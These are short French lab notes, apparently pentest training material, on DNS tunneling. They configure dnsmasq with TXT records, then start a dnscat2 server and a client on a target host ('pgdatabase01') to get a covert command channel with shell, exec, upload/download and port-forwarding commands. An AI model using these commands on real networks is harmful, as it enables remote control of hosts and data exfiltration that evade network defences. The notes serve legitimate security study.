# DNSMASQ

Sur Kali, on créé un dossier dns_tunneling :
```
mkdir dns_tunneling
```
On créé le fichier dnsmasq.conf dans ce dossier : 
```
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```

On lance dnsmasq :
```
$ sudo dnsmasq -C dnsmasq.conf -d
```

Puis on interroge le DNS depuis Kali :
```
nslookup -type=txt www.feline.corp
```

# DNSCAT2

Sur le serveur DNS, on démarre le serveur dnscat2 :
```
dnscat2-server feline.corp
```
Sur la cible, on démarre le client :
```
./dnscat feline.corp
```

Sur le DNS, on peut piloter le lien pour 
On liste toutes les fenêtres disponible :
```
dnscat2> windows
```
On ouvre la fenêtre n°1
```
dnscat2> window -i 1
```
On liste les commandes :
```
command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows

```
On met en écoute le serveur dnscat2 :
```
listen 0.0.0.0:6464 172.16.186.217:4646
```